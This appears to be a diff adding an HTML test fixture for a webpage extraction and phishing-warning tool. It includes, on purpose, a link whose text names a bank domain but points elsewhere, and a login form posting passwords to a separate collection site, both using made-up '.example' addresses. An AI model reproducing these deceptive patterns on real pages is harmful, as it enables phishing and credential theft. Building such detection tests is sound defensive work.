@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Account Notice</title></head>
+<body style="font-family:Arial;max-width:680px;margin:30px auto">
+  <!-- Test page: generic webpage extraction and warnings. All addresses are made-up ".example" names.
+       Expected: the page is ordinary EXCEPT one link whose words name one site but goes to another,
+       and a password form that sends the password to a different site. Extraction must skip the hidden
+       text and anything typed into the fields. -->
+  <h1>Account Notice</h1>
+  <p id="visible">Dear member, your yearly summary is ready.</p>
+  <p style="display:none" id="hidden">HIDDEN-SECRET-TEXT</p>
+  <p><a id="same" href="/fake-legitimate.html">Read about our programs</a></p>
+  <p><a id="mismatch" href="https://other-site.example/summary">www.chase.com/summary</a></p>
+  <p><a id="fragment" href="#visible">Back to the top</a> <a id="mail" href="mailto:help@mail.example">Email us</a></p>
+  <form id="login" action="https://collect-login.example/post" method="post" onsubmit="return false">
+    <p><input id="user" name="user" placeholder="User name"> <input id="pw" name="pw" type="password" placeholder="Password"></p>
+    <button>Sign in</button>
+  </form>
+  <textarea id="note">TEXTAREA-SECRET</textarea>
+  <script>
+    document.getElementById('user').value = 'TYPED-USER-SECRET';
+    document.getElementById('pw').value = 'TYPED-PASSWORD-SECRET';
+  </script>
+</body></html>
